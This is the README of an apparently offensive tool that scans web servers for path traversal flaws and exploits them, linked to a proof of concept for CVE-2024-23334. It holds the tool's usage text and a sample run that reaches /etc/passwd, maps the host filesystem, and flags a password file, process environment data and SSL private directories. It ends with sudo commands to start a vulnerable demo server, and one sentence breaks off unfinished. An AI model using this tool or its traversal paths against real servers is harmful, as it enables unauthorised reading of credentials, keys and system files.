# Path Traversal Directory Tree
## What is this?
This is a small application that searches and exploit a path traversal vulnerability in a web server using curl.

## Why is this?
If you don't know what you're looking for, path traversal investigation can be a lot of guessing and trying out stuff until something sticks.

I found [this project](https://github.com/z3rObyte/CVE-2024-23334-PoC/tree/main) made by [@z3rObyte](https://github.com/z3rObyte) that can find out the root level of the host machine. At the time, 

## How to use this?
```
> ./path-traversal-directory-tree.exe -h
Usage: path-traversal-directory-tree.exe [OPTIONS] --url <URL> --extensions <EXTENSIONS> --wordlist <WORDLIST>

Options:
  -u, --url <URL>
          Target host URL
  -l, --level <MAX_TRAVERSAL_LEVEL>
          Number of level to attempt path traversal [default: 8]
  -d, --vulnerable-directory <VULNERABLE_DIRECTORY>
          Name of the vulnerable directory (if known)
  -e, --extensions <EXTENSIONS>
          File extension to lookup
  -w, --wordlist <WORDLIST>
          Wordlist for path and file name lookup
  -v, --verbose
          Outputs directory attempts
  -h, --help
          Print help
  -V, --version
          Print version
```

### Sample result

```
> ./path-traversal-directory-tree.exe -u "http://localhost:8080" -e txt -w .\poc\wordlist\common.txt -l 10 -d static
== Starting Search for Root path ==
Target host: http://localhost:8080
Target file: /etc/passwd
Vulnerable Directory: /static
Max search levels: 10
Wordlist: .\poc\wordlist\common.txt
===
== Root path found ==
Vulnerable directory: /static
Level: 8
Sample path: http://localhost:8080/static/../../../../../../../../
== Running directory mapping ==
Directory: http://localhost:8080/static/../../../../../../../../bin/
File: http://localhost:8080/static/../../../../../../../../bin/ar/
File: http://localhost:8080/static/../../../../../../../../bin/arch/
File: http://localhost:8080/static/../../../../../../../../bin/as/
File: http://localhost:8080/static/../../../../../../../../bin/bash/
...
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/certs/
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/misc/
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/private/
Directory: http://localhost:8080/static/../../../../../../../../lost%2Bfound/
Directory: http://localhost:8080/static/../../../../../../../../media/
File: http://localhost:8080/static/../../../../../../../../media/password.txt      <-- Interesting file
Directory: http://localhost:8080/static/../../../../../../../../opt/
Directory: http://localhost:8080/static/../../../../../../../../proc/
Directory: http://localhost:8080/static/../../../../../../../../proc/1/
File: http://localhost:8080/static/../../../../../../../../proc/1/comm/
File: http://localhost:8080/static/../../../../../../../../proc/1/environ/
...
```

## Running the PoC
This is the same server code created by [@z3rObyte](https://github.com/z3rObyte).

```
> sudo pip install -r ./poc/requirements.txt
> sudo python3 ./poc/server.py 
```